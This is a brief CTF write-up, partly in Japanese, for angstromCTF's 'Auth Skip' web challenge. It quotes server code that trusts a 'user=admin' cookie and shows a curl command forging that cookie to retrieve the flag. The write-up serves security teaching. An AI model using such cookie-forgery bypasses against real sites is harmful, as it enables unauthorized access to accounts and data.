# Auth Skip:Web:40pts
Clam was doing his angstromCTF flag% speedrun when he ran into [the infamous timesink](https://auth-skip.web.actf.co/) known in the speedrunning community as "auth". Can you pull off the legendary auth skip and get the flag?  

[Source](index.js)  

Hint  
Do you *need* the server to log in?  

# Solution
アクセスするとログインフォームのようだがログインできない。  
Authwall  
[site.png](site/site.png)  
ソースを見ると以下のようであった。  
```JavaScript
~~~
app.get("/", (req, res) => {
    if (req.cookies.user === "admin") {
        res.type("text/plain").send(flag);
    } else {
        res.sendFile(path.join(__dirname, "index.html"));
    }
});
~~~
```
cookieのuserがadminであればフラグが得られるようだ。  
```bash
$ curl https://auth-skip.web.actf.co/ -H "Cookie: user=admin"
actf{passwordless_authentication_is_the_new_hip_thing}
```
設定してGETしてやるとflagが得られた。  

## actf{passwordless_authentication_is_the_new_hip_thing}